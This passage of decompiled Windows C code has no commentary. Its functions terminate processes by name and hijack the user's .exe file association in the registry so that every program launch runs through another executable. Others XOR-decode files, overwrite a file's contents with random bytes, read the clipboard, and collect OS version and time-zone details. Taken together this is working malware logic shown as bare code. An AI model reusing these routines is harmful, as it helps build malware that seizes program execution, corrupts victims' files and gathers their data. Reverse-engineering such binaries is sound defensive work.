  if ((int)pvVar3 < param_3 + (int)pvVar3) {
    while( true ) {
      puVar1 = (undefined *)(iVar5 + param_2);
      iVar5 = iVar5 + 1;
      *(undefined *)((int)pvVar4 + (int)pvVar2) = *puVar1;
      pvVar3 = param_1[1];
      pvVar4 = (void *)((int)pvVar4 + 1);
      if ((int)pvVar3 + param_3 <= (int)pvVar4) break;
      pvVar2 = *param_1;
    }
    pvVar2 = *param_1;
  }
  param_1[1] = (void *)((int)pvVar3 + param_3);
  *(undefined *)((int)(void *)((int)pvVar3 + param_3) + (int)pvVar2) = 0;
  return;
}



undefined4 __cdecl
FUN_00408760(char *param_1,int *param_2,char param_3,char param_4,undefined *param_5,int param_6)

{
  char cVar1;
  bool bVar2;
  size_t sVar3;
  int iVar4;
  int local_18;
  
  if (param_5 != (undefined *)0x0) {
    *param_5 = 0;
  }
  bVar2 = false;
  sVar3 = strlen(param_1);
  local_18 = 0;
  iVar4 = *param_2;
  if (iVar4 < (int)sVar3) {
    if (param_3 == '\0') {
      bVar2 = true;
    }
    do {
      cVar1 = param_1[iVar4];
      if (bVar2) {
        if (param_4 == '\0') {
          if ((cVar1 == ' ' || cVar1 == '\r') || (cVar1 == '\n' || cVar1 == '\0')) {
LAB_0040883b:
            if (param_5 != (undefined *)0x0) {
              param_5[local_18] = 0;
              iVar4 = *param_2;
            }
            *param_2 = iVar4 + 1;
            return 1;
          }
        }
        else if (cVar1 == param_4) goto LAB_0040883b;
        if (bVar2) {
          if ((int)(sVar3 - 1) <= iVar4) {
            if (param_5 != (undefined *)0x0) {
              param_5[local_18] = cVar1;
            }
            if (param_5 != (undefined *)0x0 && local_18 + 1 < param_6) {
              param_5[local_18 + 1] = 0;
            }
            *param_2 = *param_2 + 1;
            return 1;
          }
          if (param_5 != (undefined *)0x0) {
            param_5[local_18] = cVar1;
            iVar4 = *param_2;
          }
          local_18 = local_18 + 1;
        }
      }
      if (cVar1 == param_3) {
        bVar2 = true;
      }
      iVar4 = iVar4 + 1;
      *param_2 = iVar4;
    } while (iVar4 < (int)sVar3);
  }
  return 0;
}



void __cdecl FUN_004088a0(char *param_1)

{
  size_t sVar1;
  int iVar2;
  
  sVar1 = strlen(param_1);
  iVar2 = 0;
  if (0 < (int)sVar1) {
    do {
      if ((byte)(param_1[iVar2] + 0xbfU) < 0x1a) {
        param_1[iVar2] = param_1[iVar2] + ' ';
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < (int)sVar1);
  }
  return;
}



void __cdecl FUN_004088e0(char *param_1)

{
  char *_Format;
  _OSVERSIONINFOA local_ac;
  
  local_ac.dwOSVersionInfoSize = 0x94;
  GetVersionExA(&local_ac);
  if (local_ac.dwMajorVersion == 6) {
    if (local_ac.dwMinorVersion == 2) {
      _Format = "Windows 8 build %i";
    }
    else if (local_ac.dwMinorVersion == 1) {
      _Format = "Windows 7 build %i";
    }
    else {
      if (local_ac.dwMinorVersion != 0) goto LAB_0040891f;
      _Format = "Windows Vista build %i";
    }
  }
  else {
    if (local_ac.dwMajorVersion != 5) {
LAB_0040891f:
      sprintf(param_1,"Windows %i.%i build %i",local_ac.dwMajorVersion,local_ac.dwMinorVersion,
              local_ac.dwBuildNumber);
      return;
    }
    if (local_ac.dwMinorVersion == 2) {
      _Format = "Windows Server 2003 build %i";
    }
    else if (local_ac.dwMinorVersion == 1) {
      _Format = "Windows XP build %i";
    }
    else {
      if (local_ac.dwMinorVersion != 0) goto LAB_0040891f;
      _Format = "Windows 2000 build %i";
    }
  }
  sprintf(param_1,_Format,local_ac.dwBuildNumber);
  return;
}



void __cdecl FUN_004089f0(char *param_1)

{
  uint uVar1;
  HANDLE hObject;
  int iVar2;
  HANDLE hProcess;
  uint *puVar3;
  undefined4 *puStack_170;
  undefined4 local_16c;
  undefined4 local_168;
  undefined *local_150;
  undefined4 local_14c [2];
  DWORD local_144;
  uint local_128 [70];
  
  local_168 = 0;
  local_16c = 2;
  puStack_170 = (undefined4 *)0x408a0e;
  hObject = (HANDLE)CreateToolhelp32Snapshot();
  if (hObject != (HANDLE)0x0) {
    puStack_170 = local_14c;
    local_14c[0] = 0x128;
    iVar2 = Process32First();
    if (iVar2 != 0) {
      do {
        local_150 = &stack0xfffffe84;
        puVar3 = local_128;
        do {
          uVar1 = *puVar3;
          puVar3 = puVar3 + 1;
        } while ((uVar1 + 0xfefefeff & ~uVar1 & 0x80808080) == 0);
        FUN_00421910();
        strcpy((char *)&puStack_170,(char *)local_128);
        FUN_004088a0((char *)&puStack_170);
        iVar2 = strcmp((char *)&puStack_170,param_1);
        if ((iVar2 == 0) && (hProcess = OpenProcess(1,0,local_144), hProcess != (HANDLE)0x0)) {
          TerminateProcess(hProcess,0);
        }
        iVar2 = Process32Next();
      } while (iVar2 != 0);
    }
    CloseHandle(hObject);
  }
  return;
}



bool __cdecl
FUN_00408bf0(HKEY param_1,LPCSTR param_2,DWORD param_3,LPCSTR param_4,BYTE *param_5,DWORD param_6)

{
  LSTATUS LVar1;
  HKEY local_c;
  
  RegCreateKeyExA(param_1,param_2,0,(LPSTR)0x0,0,0x2001f,(LPSECURITY_ATTRIBUTES)0x0,&local_c,
                  (LPDWORD)0x0);
  if (local_c == (HKEY)0x0) {
    return false;
  }
  LVar1 = RegSetValueExA(local_c,param_4,0,param_3,param_5,param_6);
  RegCloseKey(local_c);
  return LVar1 == 0;
}



void __cdecl FUN_00408d20(char *param_1,char *param_2)

{
  int iVar1;
  size_t sVar2;
  LSTATUS LVar3;
  uint uVar4;
  uint *puVar5;
  uint *puVar6;
  uint uVar7;
  bool bVar8;
  undefined4 uStack_200;
  undefined *apuStack_1fc [3];
  undefined *local_1f0;
  HKEY local_1ec;
  HKEY local_1e8;
  HKEY local_1e4;
  HKEY local_1e0;
  HKEY local_1dc;
  HKEY local_1d8;
  HKEY local_1d4;
  HKEY local_1d0;
  HKEY local_1cc;
  HKEY local_1c8;
  HKEY local_1c4;
  HKEY local_1c0;
  HKEY local_1bc;
  HKEY local_1b8;
  DWORD local_1b4;
  HKEY local_1b0;
  BYTE local_1ac [412];
  
  iVar1 = 0;
  local_1f0 = &stack0xfffffdd4;
  bVar8 = false;
  do {
    local_1ac[iVar1] = '\0';
    iVar1 = iVar1 + 1;
  } while (iVar1 < 0x184);
  local_1b4 = 0x184;
  RegOpenKeyExA((HKEY)0x80000001,"Software\\Classes\\.exe\\shell\\open\\command",0,0x20019,
                &local_1b0);
  if (local_1b0 != (HKEY)0x0) {
    LVar3 = RegQueryValueExA(local_1b0,(LPCSTR)0x0,(LPDWORD)0x0,(LPDWORD)0x0,local_1ac,&local_1b4);
    bVar8 = LVar3 == 0;
    RegCloseKey(local_1b0);
  }
  if (!bVar8) {
    local_1ac[0] = '\0';
  }
  strlen(param_2);
  FUN_00421910();
  uStack_200 = CONCAT22(uStack_200._2_2_,0x22);
  strcat((char *)&uStack_200,param_2);
  sVar2 = strlen((char *)&uStack_200);
  *(undefined4 *)(sVar2 + (int)&uStack_200) = 0x532f2022;
  *(undefined4 *)(sVar2 + 4 + (int)&uStack_200) = 0x54524154;
  *(undefined4 *)(sVar2 + 8 + (int)&uStack_200) = 0x31252220;
  *(undefined4 *)(sVar2 + 0xc + (int)&uStack_200) = 0x2a252022;
  *(char *)(sVar2 + 0x10 + (int)&uStack_200) = '\0';
  iVar1 = strcmp((char *)local_1ac,(char *)&uStack_200);
  if (iVar1 == 0) {
    return;
  }
  apuStack_1fc[2] = &stack0xfffffdd4;
  strlen(param_1);
  FUN_00421910();
  strlen(param_2);
  FUN_00421910();
  sprintf((char *)&uStack_200,"Software\\Classes\\%s");
  uStack_200 = 0x6c707041;
  apuStack_1fc[0] = (undefined *)0x74616369;
  apuStack_1fc[1] = (undefined *)0x6e6f69;
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,(LPCSTR)&uStack_200,0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1b8,(LPDWORD)0x0);
  if (local_1b8 != (HKEY)0x0) {
    RegSetValueExA(local_1b8,(LPCSTR)0x0,0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1b8);
  }
  sprintf((char *)&uStack_200,"Software\\Classes\\%s");
  uStack_200 = 0x6c707061;
  apuStack_1fc[0] = (undefined *)0x74616369;
  apuStack_1fc[1] = (undefined *)0x2f6e6f69;
  apuStack_1fc[2] = (undefined *)0x736d2d78;
  local_1f0 = (undefined *)0x6e776f64;
  local_1ec = (HKEY)0x64616f6c;
  local_1e8 = (HKEY)((uint)local_1e8 & 0xffffff00);
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,(LPCSTR)&uStack_200,0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1bc,(LPDWORD)0x0);
  if (local_1bc != (HKEY)0x0) {
    RegSetValueExA(local_1bc,"Content-Type",0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1bc);
  }
  sprintf((char *)&uStack_200,"Software\\Classes\\%s\\DefaultIcon");
  uStack_200 = CONCAT13(uStack_200._3_1_,0x3125);
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,(LPCSTR)&uStack_200,0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1c0,(LPDWORD)0x0);
  if (local_1c0 != (HKEY)0x0) {
    RegSetValueExA(local_1c0,(LPCSTR)0x0,0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1c0);
  }
  sprintf((char *)&uStack_200,"Software\\Classes\\%s\\shell\\open\\command");
  uStack_200 = CONCAT22(uStack_200._2_2_,0x22);
  strcat((char *)&uStack_200,param_2);
  sVar2 = strlen((char *)&uStack_200);
  *(undefined4 *)(sVar2 + (int)&uStack_200) = 0x532f2022;
  *(undefined4 *)(sVar2 + 8 + (int)&uStack_200) = 0x31252220;
  *(undefined4 *)(sVar2 + 4 + (int)&uStack_200) = 0x54524154;
  *(undefined4 *)(sVar2 + 0xc + (int)&uStack_200) = 0x2a252022;
  *(undefined *)(sVar2 + 0x10 + (int)&uStack_200) = 0;
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,(LPCSTR)&uStack_200,0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1c4,(LPDWORD)0x0);
  if (local_1c4 != (HKEY)0x0) {
    RegSetValueExA(local_1c4,(LPCSTR)0x0,0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1c4);
  }
  sprintf((char *)&uStack_200,"Software\\Classes\\%s\\shell\\open\\command");
  uStack_200 = 0x22312522;
  apuStack_1fc[0] = (undefined *)0x2a2520;
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,(LPCSTR)&uStack_200,0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1c8,(LPDWORD)0x0);
  if (local_1c8 != (HKEY)0x0) {
    RegSetValueExA(local_1c8,"IsolatedCommand",0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1c8);
  }
  sprintf((char *)&uStack_200,"Software\\Classes\\%s\\shell\\runas\\command");
  uStack_200 = 0x22312522;
  apuStack_1fc[0] = (undefined *)0x2a2520;
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,(LPCSTR)&uStack_200,0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1cc,(LPDWORD)0x0);
  if (local_1cc != (HKEY)0x0) {
    RegSetValueExA(local_1cc,(LPCSTR)0x0,0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1cc);
  }
  sprintf((char *)&uStack_200,"Software\\Classes\\%s\\shell\\runas\\command");
  uStack_200 = 0x22312522;
  apuStack_1fc[0] = (undefined *)0x2a2520;
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,(LPCSTR)&uStack_200,0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1d0,(LPDWORD)0x0);
  if (local_1d0 != (HKEY)0x0) {
    RegSetValueExA(local_1d0,"IsolatedCommand",0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1d0);
  }
  strcpy((char *)&uStack_200,param_1);
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,"Software\\Classes\\.exe",0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1d4,(LPDWORD)0x0);
  if (local_1d4 != (HKEY)0x0) {
    RegSetValueExA(local_1d4,(LPCSTR)0x0,0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1d4);
  }
  uStack_200 = 0x6c707061;
  apuStack_1fc[0] = (undefined *)0x74616369;
  apuStack_1fc[1] = (undefined *)0x2f6e6f69;
  apuStack_1fc[2] = (undefined *)0x736d2d78;
  local_1f0 = (undefined *)0x6e776f64;
  local_1ec = (HKEY)0x64616f6c;
  local_1e8 = (HKEY)((uint)local_1e8 & 0xffffff00);
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,"Software\\Classes\\.exe",0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1d8,(LPDWORD)0x0);
  if (local_1d8 != (HKEY)0x0) {
    RegSetValueExA(local_1d8,"Content-Type",0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1d8);
  }
  uStack_200 = CONCAT13(uStack_200._3_1_,0x3125);
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,"Software\\Classes\\.exe\\DefaultIcon",0,(LPSTR)0x0,0,0x2001f,
                  (LPSECURITY_ATTRIBUTES)0x0,&local_1dc,(LPDWORD)0x0);
  if (local_1dc != (HKEY)0x0) {
    RegSetValueExA(local_1dc,(LPCSTR)0x0,0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1dc);
  }
  uStack_200 = CONCAT22(uStack_200._2_2_,0x22);
  strcat((char *)&uStack_200,param_2);
  sVar2 = strlen((char *)&uStack_200);
  *(undefined4 *)(sVar2 + (int)&uStack_200) = 0x532f2022;
  *(undefined4 *)(sVar2 + 4 + (int)&uStack_200) = 0x54524154;
  *(undefined4 *)(sVar2 + 8 + (int)&uStack_200) = 0x31252220;
  *(undefined4 *)(sVar2 + 0xc + (int)&uStack_200) = 0x2a252022;
  *(undefined *)(sVar2 + 0x10 + (int)&uStack_200) = 0;
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,"Software\\Classes\\.exe\\shell\\open\\command",0,(LPSTR)0x0,0,
                  0x2001f,(LPSECURITY_ATTRIBUTES)0x0,&local_1e0,(LPDWORD)0x0);
  if (local_1e0 != (HKEY)0x0) {
    RegSetValueExA(local_1e0,(LPCSTR)0x0,0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1e0);
  }
  uStack_200 = 0x22312522;
  apuStack_1fc[0] = (undefined *)0x2a2520;
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,"Software\\Classes\\.exe\\shell\\open\\command",0,(LPSTR)0x0,0,
                  0x2001f,(LPSECURITY_ATTRIBUTES)0x0,&local_1e4,(LPDWORD)0x0);
  if (local_1e4 != (HKEY)0x0) {
    RegSetValueExA(local_1e4,"IsolatedCommand",0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1e4);
  }
  uStack_200 = 0x22312522;
  apuStack_1fc[0] = (undefined *)0x2a2520;
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,"Software\\Classes\\.exe\\shell\\runas\\command",0,(LPSTR)0x0,0,
                  0x2001f,(LPSECURITY_ATTRIBUTES)0x0,&local_1e8,(LPDWORD)0x0);
  if (local_1e8 != (HKEY)0x0) {
    RegSetValueExA(local_1e8,(LPCSTR)0x0,0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1e8);
  }
  uStack_200 = 0x22312522;
  apuStack_1fc[0] = (undefined *)0x2a2520;
  puVar5 = &uStack_200;
  do {
    puVar6 = puVar5;
    puVar5 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar4 = uVar7 & 0x80808080;
  } while (uVar4 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar4 = uVar4 >> 0x10;
    puVar5 = (uint *)((int)puVar6 + 6);
  }
  RegCreateKeyExA((HKEY)0x80000001,"Software\\Classes\\.exe\\shell\\runas\\command",0,(LPSTR)0x0,0,
                  0x2001f,(LPSECURITY_ATTRIBUTES)0x0,&local_1ec,(LPDWORD)0x0);
  if (local_1ec != (HKEY)0x0) {
    RegSetValueExA(local_1ec,"IsolatedCommand",0,1,(BYTE *)&uStack_200,
                   (int)puVar5 + ((-3 - (uint)CARRY1((byte)uVar4,(byte)uVar4)) - (int)&uStack_200));
    RegCloseKey(local_1ec);
  }
  return;
}



void __cdecl FUN_00409bf0(int param_1,int param_2,int param_3,int param_4)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  
  uVar3 = 0;
  for (iVar1 = 0; iVar1 < param_2; iVar1 = iVar1 + 1) {
    uVar2 = -(uint)((int)uVar3 < param_4) & uVar3;
    uVar3 = uVar2 + 1;
    *(byte *)(iVar1 + param_1) = *(byte *)(iVar1 + param_1) ^ -*(char *)(uVar2 + param_3);
  }
  return;
}



undefined4 __cdecl FUN_00409c30(char *param_1,char *param_2,int param_3,int param_4)

{
  FILE *pFVar1;
  undefined4 uVar2;
  size_t _Count;
  void *_Str;
  int iVar3;
  uint uVar4;
  uint uVar5;
  int local_14;
  
  pFVar1 = fopen(param_1,"rb");
  uVar2 = 0;
  if (pFVar1 != (FILE *)0x0) {
    fseek(pFVar1,0,2);
    _Count = ftell(pFVar1);
    _Str = FUN_0041f7e0(_Count);
    fseek(pFVar1,0,0);
    local_14 = 0;
    if (0 < (int)_Count) {
      do {
        if ((*(byte *)&pFVar1->_flag & 0x10) != 0) break;
        fread((void *)((int)_Str + local_14),1,1,pFVar1);
        local_14 = local_14 + 1;
      } while (local_14 < (int)_Count);
    }
    uVar5 = 0;
    fclose(pFVar1);
    for (iVar3 = 0; iVar3 < (int)_Count; iVar3 = iVar3 + 1) {
      uVar4 = -(uint)((int)uVar5 < param_4) & uVar5;
      uVar5 = uVar4 + 1;
      *(byte *)(iVar3 + (int)_Str) = *(byte *)(iVar3 + (int)_Str) ^ -*(char *)(uVar4 + param_3);
    }
    pFVar1 = fopen(param_2,"wb");
    uVar2 = 0;
    if (pFVar1 != (FILE *)0x0) {
      fwrite(_Str,1,_Count,pFVar1);
      fclose(pFVar1);
      uVar2 = 1;
    }
  }
  return uVar2;
}



undefined4 __cdecl FUN_00409d60(char *param_1)

{
  byte *pbVar1;
  uint uVar2;
  FILE *pFVar3;
  int iVar4;
  long _Offset;
  uint uVar5;
  time_t tVar6;
  byte abStack_50 [12];
  longlong local_44;
  int local_38;
  byte *local_34;
  int local_30;
  byte *local_2c;
  undefined *local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  uint local_18;
  uint uStack_14;
  
  tVar6 = time((time_t *)0x0);
  srand((uint)tVar6);
  pFVar3 = fopen(param_1,"rb");
  if (pFVar3 != (FILE *)0x0) {
    local_28 = &stack0xffffffa4;
    FUN_00421910();
    uVar5 = 0;
    do {
      iVar4 = fgetc(pFVar3);
      abStack_50[uVar5] = (byte)iVar4;
      uVar5 = uVar5 + 1;
    } while (uVar5 < 0x40);
    local_24 = uStack_14;
    _Offset = ftell(pFVar3);
    fseek(pFVar3,0,2);
    local_18 = ftell(pFVar3);
    fseek(pFVar3,_Offset,0);
    local_20 = local_18 - local_24;
    fseek(pFVar3,local_24,0);
    FUN_00421910();
    local_30 = 0;
    local_2c = abStack_50;
    uVar5 = local_24;
    if (local_24 < local_18) {
      do {
        uVar5 = uVar5 + 1;
        iVar4 = fgetc(pFVar3);
        local_2c[local_30] = (byte)iVar4;
        local_30 = local_30 + (uint)(uVar5 != 1);
      } while (uVar5 < local_18);
    }
    local_1c = local_24 - 0x40;
    fseek(pFVar3,0x41,0);
    FUN_00421910();
    local_38 = 0;
    local_34 = abStack_50;
    uVar5 = 0x41;
    if (0x41 < local_1c) {
      do {
        uVar5 = uVar5 + 1;
        iVar4 = fgetc(pFVar3);
        local_34[local_38] = (byte)iVar4;
        local_38 = local_38 + (uint)(uVar5 != 1);
      } while (uVar5 < local_1c);
    }
    fclose(pFVar3);
    pFVar3 = fopen(param_1,"wb");
    if (pFVar3 != (FILE *)0x0) {
      uVar5 = 0;
      do {
        pbVar1 = abStack_50 + uVar5;
        uVar5 = uVar5 + 1;
        fputc((uint)*pbVar1,pFVar3);
        uVar2 = local_1c;
      } while (uVar5 < 0x40);
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        iVar4 = rand();
        local_44 = (longlong)iVar4 * -0x7f7f7f7f;
        fputc(iVar4 % 0xff,pFVar3);
      }
      uVar5 = 0;
      if (local_20 != 0) {
        do {
          pbVar1 = local_2c + uVar5;
          uVar5 = uVar5 + 1;
          fputc((uint)*pbVar1,pFVar3);
        } while (uVar5 < local_20);
      }
      fclose(pFVar3);
      return 1;
    }
  }
  return 0;
}



LPVOID FUN_00409fe0(void)

{
  BOOL BVar1;
  HANDLE hMem;
  LPVOID pvVar2;
  
  BVar1 = OpenClipboard((HWND)0x0);
  if (BVar1 == 0) {
    return (LPVOID)0x0;
  }
  hMem = GetClipboardData(1);
  pvVar2 = GlobalLock(hMem);
  GlobalUnlock(hMem);
  CloseClipboard();
  return pvVar2;
}



// WARNING: Unable to track spacebase fully for stack

char * FUN_0040a2e0(void)

{
  int *piVar1;
  uint uVar2;
  char *pcVar3;
  uint *puVar4;
  int iVar5;
  uint *puVar6;
  uint uVar7;
  bool bVar8;
  char acStack_330 [12];
  char *local_324;
  HANDLE local_320;
  int local_31c;
  char *local_318;
  int *local_314;
  LPVOID local_310;
  undefined4 local_30c;
  undefined *local_2f8;
  undefined *local_2f4;
  undefined *local_2f0;
  undefined *local_2ec;
  undefined *local_2e8;
  undefined4 local_2dc [9];
  uint local_2b8 [72];
  uint local_198 [67];
  uint local_8c [16];
  _SYSTEMTIME local_4c;
  _SYSTEMTIME local_3c;
  char *local_2c;
  int local_28;
  undefined local_1c [12];
  
  local_2f0 = local_1c;
  local_2e8 = &stack0xfffffca4;
  local_2ec = &DAT_0040a817;
  local_2f8 = &DAT_0041efe0;
  local_2f4 = &DAT_00422e74;
  FUN_00421a50(&local_310);
  local_30c = 0xffffffff;
  local_314 = (int *)&stack0xfffffca4;
  FUN_00408670(&local_2c);
  local_30c = 1;
  FUN_004086e0(&local_2c,0x425100,0x22);
  GetSystemTime(&local_3c);
  GetLocalTime(&local_4c);
  local_30c = 1;
  sprintf((char *)local_8c,"Time zone: GMT %c%i\n");
  puVar4 = local_8c;
  do {
    puVar6 = puVar4;
    puVar4 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar2 = uVar7 & 0x80808080;
  } while (uVar2 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar2 = uVar2 >> 0x10;
    puVar4 = (uint *)((int)puVar6 + 6);
  }
  local_30c = 1;
  FUN_004086e0(&local_2c,(int)local_8c,
               (int)puVar4 + ((-3 - (uint)CARRY1((byte)uVar2,(byte)uVar2)) - (int)local_8c));
  sprintf((char *)local_8c,"Local time: %i.%i.%i %i:%i:%i\n");
  puVar4 = local_8c;
  do {
    puVar6 = puVar4;
    puVar4 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar2 = uVar7 & 0x80808080;
  } while (uVar2 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar2 = uVar2 >> 0x10;
    puVar4 = (uint *)((int)puVar6 + 6);
  }
